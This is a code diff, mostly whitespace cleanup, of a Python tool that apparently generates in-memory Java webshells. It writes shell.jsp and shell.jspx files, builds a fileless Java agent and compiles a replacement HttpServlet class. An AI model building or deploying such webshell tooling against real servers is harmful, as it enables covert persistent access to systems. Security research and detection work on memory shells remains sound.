@@ -11,14 +11,14 @@ from config.environment import *
 
 
 LOGO = r"""
- _____ ______    ________   _____ ______    ________   ________   
-|\   _ \  _   \ |\   ____\ |\   _ \  _   \ |\   __  \ |\   __  \  
-\ \  \\\__\ \  \\ \  \___|_\ \  \\\__\ \  \\ \  \|\  \\ \  \|\  \ 
+ _____ ______    ________   _____ ______    ________   ________
+|\   _ \  _   \ |\   ____\ |\   _ \  _   \ |\   __  \ |\   __  \
+\ \  \\\__\ \  \\ \  \___|_\ \  \\\__\ \  \\ \  \|\  \\ \  \|\  \
  \ \  \\|__| \  \\ \_____  \\ \  \\|__| \  \\ \   __  \\ \   ____\
   \ \  \    \ \  \\|____|\  \\ \  \    \ \  \\ \  \ \  \\ \  \___|
-   \ \__\    \ \__\ ____\_\  \\ \__\    \ \__\\ \__\ \__\\ \__\   
-    \|__|     \|__||\_________\\|__|     \|__| \|__|\|__| \|__|   
-                   \|_________|                                   
+   \ \__\    \ \__\ ____\_\  \\ \__\    \ \__\\ \__\ \__\\ \__\
+    \|__|     \|__||\_________\\|__|     \|__| \|__|\|__| \|__|
+                   \|_________|
 """
 
 def genscript(b64_str):
@@ -26,6 +26,7 @@ def genscript(b64_str):
     with open(jsp_dst, 'w') as f:
         f.write(JSP_PREFIX+b64_str+JSP_POSTFIX)
         print(f"            {jsp_dst}")
+
     jspx_dst = "target/shell.jspx"
     with open(jspx_dst, 'w') as f:
         f.write(JSPX_PREFIX+b64_str+JSPX_POSTFIX)
@@ -34,6 +35,7 @@ def genscript(b64_str):
 def b64file(file_name):
     with open(file_name, "rb") as fb:
         b64_str = base64.b64encode(fb.read()).decode("utf-8")
+
     if "javax" in file_name.lower():
         src_dst = 'target/AgentFileless.java'
         src = AGENTFILELESS.format(
@@ -48,14 +50,16 @@ def b64file(file_name):
             stdout=subprocess.PIPE,stderr=subprocess.STDOUT
         )
         sleep(1)
+
         class_dst = f'target/AgentFileless.class'
         print(f"            {class_dst}")
-        
+
         b64file(class_dst)
         return
+
     if generate_script and "spring" not in file_name.lower():
         genscript(b64_str)
-        
+
     try:
         pyperclip = import_module("pyperclip")
         pyperclip.copy(b64_str)
@@ -104,7 +108,7 @@ def generator(options):
 
     with open(src_dst, 'w') as f:
         f.write(src)
-        
+
     print(
         f'\nOutputPath: {src_dst}'
     )
@@ -116,6 +120,7 @@ def generator(options):
             stdout=subprocess.PIPE,stderr=subprocess.STDOUT
         )
         sleep(1)
+
         if model_name == "javax":
             class_dst = 'target/javax/servlet/http/HttpServlet.class'
         else:
